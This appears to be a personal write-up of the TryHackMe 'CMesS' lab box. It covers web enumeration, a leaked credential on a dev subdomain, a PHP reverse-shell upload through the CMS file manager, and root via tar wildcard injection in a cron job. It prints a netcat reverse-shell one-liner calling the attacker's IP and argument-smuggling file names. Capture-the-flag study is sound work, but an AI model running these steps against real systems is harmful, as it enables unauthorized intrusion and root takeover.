---
title: TryHackMe - CMesS
date: 2023-02-18
author: Marius
tags: [ctf, 'tryhackme', 'thm', 'linux']
---

Medium and free box found in TryHackMe.

### Enumeration

Nmap scan with version and script scan.

```
ORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Looks like attach vector will this webserver. Before continuing, I have added domain to the hosts file.

```
└─$ echo "10.10.11.95 cmess.thm" | sudo tee -a /etc/hosts  
10.10.11.95 cmess.thm
```

Directory enumeration:

```
                                                                                                                  
┌──(kali㉿kali)-[~/tryhackme/cmess]
└─$ feroxbuster --url http://cmess.thm --no-recursion

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cmess.thm
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      109l      291w     3862c http://cmess.thm/category
200      GET      107l      290w     3851c http://cmess.thm/blog
301      GET        9l       28w      312c http://cmess.thm/lib => http://cmess.thm/lib/?url=lib
200      GET      107l      290w     3865c http://cmess.thm/
200      GET        0l        0w        0c http://cmess.thm/api
301      GET        9l       28w      318c http://cmess.thm/assets => http://cmess.thm/assets/?url=assets
200      GET       41l       99w     1580c http://cmess.thm/login
200      GET       41l       99w     1580c http://cmess.thm/admin
301      GET        9l       28w      312c http://cmess.thm/tmp => http://cmess.thm/tmp/?url=tmp
200      GET      101l      272w     3590c http://cmess.thm/author
200      GET      107l      290w     3851c http://cmess.thm/Search
[>-------------------] - 50s      423/30000   58m     found:11      errors:299    
[>-------------------] - 50s      423/30000   58m     found:11      errors:30
```

Directory scan discovered admin login page.

![alt text](/assets/img/cmess/1.png)

Ffuf discovered a sub-domain called **dev**. 

```
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://cmess.thm -H "Host: FUZZ.cmess.thm" -fw 522,229,1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response words: 522,229,1
________________________________________________

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31, Duration: 6565ms]
```

I have added **dev.cmess.thm** to **/etc/hosts** and by accessing this page I have found my first password.

![alt text](/assets/img/cmess/2.png)
andre@cmess.thm:KPFTN_f2yxe% 

### Exploitation

With credentials I have logged on to admin page.

![alt text](/assets/img/cmess/3.png)

After poking around within this website, I found a File Manager which can be used to upload any filetype to the server. I have uploaded a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and was able to receive a reverse shell on my listener.

![alt text](/assets/img/cmess/4.png)

```
└─$ nc -nvlp 80                               
listening on [any] 80 ...
connect to [10.8.25.174] from (UNKNOWN) [10.10.11.95] 52542
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 06:53:54 up 15 min,  0 users,  load average: 0.10, 13.00, 13.36
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"


www-data@cmess:/$ 
www-data@cmess:/$ whoami 
whoami
www-data
```

I have uploaded and spun up **linpeas.sh,** which found a potential PE vector.

![alt text](/assets/img/cmess/5.png)

Aditionally an interesting file was found.

![alt text](/assets/img/cmess/7.png)

Looks like **password.bak** contained password for andre. Which was usde to sucesfully change user.

```
www-data@cmess:/tmp$ cat /opt/.password.bak
cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6

www-data@cmess:/tmp$ su andre
su andre
Password: UQfsdCB7aAP6

andre@cmess:/tmp$ 
```

### Privilege escalation

After sucesfully logging in as andre, I can now write to the backup folder. This can be used to exploit unsecure cronjob to gain access as the root user.

[This article](https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e) has a great description on how to exploit this misconfiguration.

```
andre@cmess:~/backup$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.25.174 80 >/tmp/f" > shell.sh
<at /tmp/f|/bin/sh -i 2>&1|nc 10.8.25.174 80 >/tmp/f" > shell.sh             
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
```

After waiting a minute I received a reverse shell with root privileges.

```
└─$ nc -nvlp 80                               
listening on [any] 80 ...
connect to [10.8.25.174] from (UNKNOWN) [10.10.11.95] 52588
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```
